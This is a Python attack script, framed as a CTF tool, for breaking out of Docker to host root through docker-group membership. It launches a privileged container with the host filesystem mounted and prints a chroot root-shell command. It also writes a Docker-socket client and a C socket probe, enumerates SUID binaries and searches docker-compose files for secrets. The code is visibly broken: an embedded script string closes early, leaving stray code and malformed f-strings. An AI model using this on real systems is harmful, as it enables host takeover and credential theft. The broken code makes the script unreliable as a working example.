#!/usr/bin/env python3
"""
Docker Container Breakout Exploit using Docker Group Membership
For CTF challenges - Educational purposes only
"""

import os
import subprocess
import time
import argparse
import shutil
import sys
import tempfile
import socket
import glob
import json
import stat

def run_command(command, shell=False, timeout=30):
    """Run a system command and return the output"""
    try:
        if shell:
            process = subprocess.run(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=timeout
            )
        else:
            process = subprocess.run(
                command.split(), 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=timeout
            )
        return process.stdout.strip(), process.stderr.strip(), process.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout} seconds", 1
    except Exception as e:
        return "", str(e), 1

def check_docker_group():
    """Check if the current user is in the docker group"""
    print("[*] Checking if current user is in docker group...")
    
    # Check groups via subprocess
    stdout, stderr, ret = run_command("groups")
    if "docker" in stdout:
        print("[+] Current user is in the docker group!")
        return True
    else:
        print("[-] Current user is not in docker group")
        print(f"[*] Groups: {stdout}")
        return False

def find_docker_binary():
    """Find the Docker binary in the system"""
    print("[*] Looking for Docker binary...")
    
    # Common paths where docker might be installed
    docker_paths = [
        "/usr/bin/docker",
        "/usr/local/bin/docker",
        "/bin/docker",
        "/sbin/docker",
        "/snap/bin/docker",
        "/usr/sbin/docker"
    ]
    
    for path in docker_paths:
        if os.path.exists(path) and os.access(path, os.X_OK):
            print(f"[+] Found Docker binary at {path}")
            return path
    
    # Try to find using which command
    stdout, stderr, ret = run_command("which docker")
    if ret == 0 and os.path.exists(stdout):
        print(f"[+] Found Docker binary at {stdout}")
        return stdout
    
    print("[-] Docker binary not found")
    return None

def find_docker_sock():
    """Find the Docker socket in the system"""
    print("[*] Looking for Docker socket...")
    
    # Common paths where docker socket might be located
    sock_paths = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/var/lib/docker.sock",
        "/tmp/docker.sock",
        # Also try unix socket directories
        *glob.glob("/var/run/docker/*.sock"),
        *glob.glob("/run/docker/*.sock")
    ]
    
    for path in sock_paths:
        if os.path.exists(path):
            print(f"[+] Found Docker socket at {path}")
            return path
    
    print("[-] Docker socket not found")
    return None

def create_docker_socket_client():
    """Create a client that connects directly to Docker socket"""
    print("[*] Creating Docker socket client script...")
    
    script_path = "/tmp/docker_client.py"
    with open(script_path, "w") as f:
        f.write('''#!/usr/bin/env python3''')
import socket
import json
import sys
import os

def send_http_request(sock_path, method, endpoint, data=None, headers=None):
    """Send HTTP request to Docker socket"""
    if not headers:
        headers = {}
        
    headers["Host"] = "localhost"
    headers["Content-Type"] = "application/json"
    
    if data:
        data_str = json.dumps(data)
        headers["Content-Length"] = str(len(data_str))
    else:
        data_str = ""
        
    # Build request
    request = f"{method} {endpoint} HTTP/1.1\\r\\n"
    for key, value in headers.items():
        request += f"{key}: {value}\\r\\n"
    request += "\\r\\n"
    
    if data:
        request += data_str
        
    # Connect to socket
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(sock_path)
    
    # Send request
    sock.sendall(request.encode())
    
    # Get response
    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
        
    sock.close()
    return response.decode()

def create_privileged_container(sock_path, image="alpine:latest"):
    """Create a privileged container that mounts host filesystem"""
    print(f"[*] Creating privileged container using {image}...")
    
    # Prepare container creation request
    container_config = {
        "Image": image,
        "Cmd": ["sleep", "3600"],
        "DetachKeys": "Ctrl-p,Ctrl-q",
        "OpenStdin": True,
        "Tty": True,
        "HostConfig": {
            "Privileged": True,  # This is the key for privilege escalation
            "Binds": ["/:/host_root:rw"]  # Mount host root to /host_root
        }
    }
    
    # Create container
    response = send_http_request(
        sock_path, 
        "POST", 
        "/v1.41/containers/create", 
        data=container_config
    )
    
    # Parse container ID from response
    try:
        http_body = response.split("\\r\\n\\r\\n")[1]
        container_info = json.loads(http_body)
        container_id = container_info.get("Id", "")
        print(f"[+] Container created with ID: {container_id}")
        return container_id
    except Exception as e:
        print(f"[-] Failed to create container: {e}")
        print(f"[-] Response: {response}")
        return None

def start_container(sock_path, container_id):
    """Start the container"""
    print(f"[*] Starting container {container_id}...")
    
    response = send_http_request(
        sock_path,
        "POST",
        f"/v1.41/containers/{container_id}/start"
    )
    
    if "204 No Content" in response:
        print("[+] Container started successfully")
        return True
    else:
        print(f"[-] Failed to start container: {response}")
        return False

def exec_in_container(sock_path, container_id, cmd):
    """Execute command in the container"""
    print(f"[*] Executing command in container: {cmd}...")
    
    # Create exec instance
    exec_config = {
        "AttachStdin": True,
        "AttachStdout": True,
        "AttachStderr": True,
        "Tty": True,
        "Cmd": cmd
    }
    
    response = send_http_request(
        sock_path,
        "POST",
        f"/v1.41/containers/{container_id}/exec",
        data=exec_config
    )
    
    try:
        http_body = response.split("\\r\\n\\r\\n")[1]
        exec_info = json.loads(http_body)
        exec_id = exec_info.get("Id", "")
        
        # Start the exec instance
        exec_start = {
            "Detach": False,
            "Tty": True
        }
        
        response = send_http_request(
            sock_path,
            "POST",
            f"/v1.41/exec/{exec_id}/start",
            data=exec_start
        )
        
        # The response should contain the command output
        output = response.split("\\r\\n\\r\\n")[1]
        return output
    except Exception as e:
        print(f"[-] Failed to exec in container: {e}")
        return None

def breakout_via_socket(sock_path):
    """Break out of the container using Docker socket"""
    print("[*] Attempting breakout via Docker socket...")
    
    # Create container
    container_id = create_privileged_container(sock_path)
    if not container_id:
        return False
    
    # Start container
    if not start_container(sock_path, container_id):
        return False
    
    # Execute command to access host filesystem
    print("[*] Accessing host filesystem...")
    output = exec_in_container(
        sock_path,
        container_id,
        ["sh", "-c", "ls -la /host_root && echo 'Breakout successful!' && touch /host_root/tmp/container_escape_proof"]
    )
    
    if output and "Breakout successful" in output:
        print("[+] Breakout successful!")
        print("[+] Host filesystem is accessible in the privileged container at /host_root")
        print("[+] Proof file created at /host_root/tmp/container_escape_proof")
        
        # Get shell
        print("[*] Getting interactive shell with host access...")
        print("[*] Use the following command to open a shell:")
        cmd1 = f'''curl -s --unix-socket {sock_path} -X POST -H "Content-Type: application/json" -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh"]}' http://localhost/v1.41/containers/{container_id}/exec | json_pp'''
        print(f"    {cmd1}")
        print(f"    # Then get the exec ID and run:")
        cmd2 = f'''curl -s --unix-socket {sock_path} -X POST -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}' http://localhost/v1.41/exec/EXEC_ID/start'''
        print(f"    {cmd2}")
        
        return True
    else:
        print("[-] Breakout failed")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        sock_path = sys.argv[1]
    else:
        sock_path = "/var/run/docker.sock"
    
    breakout_via_socket(sock_path)
''')
    
    os.chmod(script_path, 0o755)
    print(f"[+] Created Docker socket client script at: {script_path}")
    return script_path

def create_docker_escape_script():
    """Create a simple Docker escape script using docker group permissions"""
    print("[*] Creating Docker escape script...")
    
    script_path = "/tmp/docker_escape.sh"
    with open(script_path, "w") as f:
        f.write("""#!/bin/sh
# Docker escape script for users in docker group

# Check if we have access to docker command
if ! command -v docker >/dev/null 2>&1; then
    echo "[-] Docker command not found"
    exit 1
fi

echo "[*] Attempting to use docker command for breakout..."

# Try to create a privileged container
echo "[*] Creating privileged container..."
CONTAINER_ID=$(docker run -d --privileged --pid=host -v /:/host_root alpine:latest sleep 1000)

if [ -z "$CONTAINER_ID" ]; then
    echo "[-] Failed to create container"
    exit 1
fi

echo "[+] Created container: $CONTAINER_ID"

# Execute commands in the container to access host filesystem
echo "[*] Accessing host filesystem..."
docker exec -it "$CONTAINER_ID" sh -c "echo '[+] From inside the container:' && ls -la /host_root/root"

echo "[*] Creating proof file on host..."
docker exec -it "$CONTAINER_ID" sh -c "touch /host_root/tmp/container_escape_proof"

echo "[+] Breakout successful! The host filesystem is mounted at /host_root inside container $CONTAINER_ID"
echo "[+] To get a shell with access to the host, run:"
echo "    docker exec -it $CONTAINER_ID sh"
echo "[+] Then you can access the host filesystem at /host_root"
echo "[+] To get a root shell on the host system, run:"
echo "    docker exec -it $CONTAINER_ID chroot /host_root sh"
""")
    
    os.chmod(script_path, 0o755)
    print(f"[+] Created Docker escape script at: {script_path}")
    return script_path

def find_suid_binaries():
    """Find SUID binaries that might be used for privilege escalation"""
    print("[*] Looking for SUID binaries...")
    
    # This command finds SUID binaries
    stdout, stderr, ret = run_command("find / -type f -perm -4000 -ls 2>/dev/null", shell=True)
    
    if not stdout:
        print("[-] No SUID binaries found or not enough permissions")
        return []
    
    suid_bins = stdout.split('\n')
    print(f"[+] Found {len(suid_bins)} SUID binaries")
    
    interesting_bins = []
    known_dangerous = ["mount", "umount", "pkexec", "sudo", "su", "newgrp", "chsh", "docker", "containerd", "runc"]
    
    for line in suid_bins:
        if any(bin_name in line for bin_name in known_dangerous):
            print(f"[!] Potentially exploitable SUID binary: {line}")
            interesting_bins.append(line)
    
    return interesting_bins

def check_docker_compose():
    """Check for docker-compose files that might contain credentials"""
    print("[*] Looking for docker-compose files...")
    
    # This command finds docker-compose files
    stdout, stderr, ret = run_command("find / -name docker-compose.yml -o -name docker-compose.yaml 2>/dev/null", shell=True)
    
    if not stdout:
        print("[-] No docker-compose files found")
        return []
    
    files = stdout.split('\n')
    print(f"[+] Found {len(files)} docker-compose files")
    
    for file in files:
        if os.path.exists(file) and os.access(file, os.R_OK):
            print(f"[+] Reading {file}...")
            try:
                with open(file, 'r') as f:
                    content = f.read()
                    # Look for interesting strings like passwords, tokens, etc.
                    for keyword in ['password', 'secret', 'token', 'key', 'credential']:
                        if keyword in content.lower():
                            print(f"[!] Found potential credential in {file} containing keyword '{keyword}'")
            except Exception as e:
                print(f"[-] Error reading {file}: {e}")
    
    return files

def create_direct_socket_exploit():
    """Create a minimal C exploit to directly access Docker socket"""
    print("[*] Creating minimal C exploit for Docker socket...")
    
    temp_dir = tempfile.mkdtemp()
    source_path = os.path.join(temp_dir, "docker_socket_exploit.c")
    
    with open(source_path, "w") as f:
        f.write("""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>

#define DOCKER_SOCKET "/var/run/docker.sock"
#define BUFFER_SIZE 4096

int main(int argc, char *argv[]) {
    struct sockaddr_un addr;
    char buffer[BUFFER_SIZE];
    int sockfd, ret;
    
    printf("[*] Attempting direct Docker socket connection\\n");
    
    // Create socket
    sockfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("[-] Socket creation failed");
        return 1;
    }
    
    // Set up socket address
    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, DOCKER_SOCKET, sizeof(addr.sun_path) - 1);
    
    // Connect to Docker socket
    ret = connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr_un));
    if (ret == -1) {
        perror("[-] Connect failed");
        return 1;
    }
    
    printf("[+] Connected to Docker socket!\\n");
    
    // HTTP request to get container list
    const char *http_request = "GET /v1.41/containers/json HTTP/1.1\\r\\n"
                               "Host: localhost\\r\\n"
                               "Content-Type: application/json\\r\\n"
                               "Connection: close\\r\\n"
                               "\\r\\n";
    
    // Send request
    ret = write(sockfd, http_request, strlen(http_request));
    if (ret == -1) {
        perror("[-] Write failed");
        close(sockfd);
        return 1;
    }
    
    printf("[+] Sent container list request\\n");
    
    // Get response
    memset(buffer, 0, BUFFER_SIZE);
    ret = read(sockfd, buffer, BUFFER_SIZE - 1);
    if (ret == -1) {
        perror("[-] Read failed");
        close(sockfd);
        return 1;
    }
    
    printf("[+] Response from Docker daemon:\\n%s\\n", buffer);
    
    // Check if we got a 200 OK
    if (strstr(buffer, "HTTP/1.1 200 OK") != NULL) {
        printf("[+] Successfully accessed Docker API via socket!\\n");
        printf("[+] You can use this socket for breakout. Run the Python script for full exploitation.\\n");
    } else {
        printf("[-] Failed to get successful response from Docker API\\n");
    }
    
    close(sockfd);
    return 0;
}
""")
    
    # Compile the exploit
    print("[*] Compiling C exploit...")
    binary_path = os.path.join(temp_dir, "docker_socket_exploit")
    compile_cmd = f"gcc -o {binary_path} {source_path}"
    stdout, stderr, ret = run_command(compile_cmd, shell=True)
    
    if ret != 0:
        print(f"[-] Compilation failed: {stderr}")
        return None
    
    # Make executable
    os.chmod(binary_path, 0o755)
    print(f"[+] Compiled Docker socket exploit at: {binary_path}")
    return binary_path

def main():
    print("╔═══════════════════════════════════════════════╗")
    print("║ Docker Group Privilege Escalation Exploit     ║")
    print("║ For CTF challenges - Educational use only     ║")
    print("╚═══════════════════════════════════════════════╝")
    
    # Check if user is in docker group
    in_docker_group = check_docker_group()
    
    # Find Docker binary
    docker_binary = find_docker_binary()
    
    # Find Docker socket
    docker_socket = find_docker_sock()
    
    # Create Docker escape script
    if docker_binary and in_docker_group:
        docker_escape = create_docker_escape_script()
        print("[*] Testing Docker escape script...")
        stdout, stderr, ret = run_command(docker_escape, shell=True)
        print(stdout)
        if ret == 0 and "Breakout successful" in stdout:
            print("[+] Breakout successful using Docker binary!")
            return
        else:
            print("[-] Docker binary method failed, trying socket method...")
    
    # Try direct socket method
    if docker_socket:
        print("[*] Found Docker socket, attempting direct socket method...")
        
        # Create Python socket client
        socket_client = create_docker_socket_client()
        
        # Try to run the socket client
        print("[*] Testing Docker socket client...")
        stdout, stderr, ret = run_command(f"python3 {socket_client} {docker_socket}", shell=True)
        print(stdout)
        
        # Try C socket exploit
        print("[*] Testing C socket exploit...")
        c_exploit = create_direct_socket_exploit()
        if c_exploit:
            stdout, stderr, ret = run_command(c_exploit, shell=True)
            print(stdout)
    
    # If all else fails, look for SUID binaries
    suid_bins = find_suid_binaries()
    
    # Check for docker-compose files
    compose_files = check_docker_compose()
    
    # Final summary
    print("\n[*] Exploit Summary:")
    if in_docker_group:
        print("[+] User is in docker group - high breakout potential")
    if docker_binary:
        print(f"[+] Docker binary found at {docker_binary}")
    if docker_socket:
        print(f"[+] Docker socket found at {docker_socket}")
    if suid_bins:
        print(f"[+] Found {len(suid_bins)} interesting SUID binaries")
    if compose_files:
        print(f"[+] Found {len(compose_files)} docker-compose files that might contain credentials")
    
    print("\n[!] What to try next:")
    print("    1. If docker binary works: Run the docker escape script")
    print("       /tmp/docker_escape.sh")
    print("    2. If docker socket is accessible: Try the socket client")
    print("       python3 /tmp/docker_client.py [socket_path]")
    print("    3. Look for potential credentials in docker-compose files")
    print("    4. Check for vulnerable SUID binaries")
    print("    5. Try older Docker exploits like CVE-2019-5736 (runc)")

if __name__ == "__main__":
    main()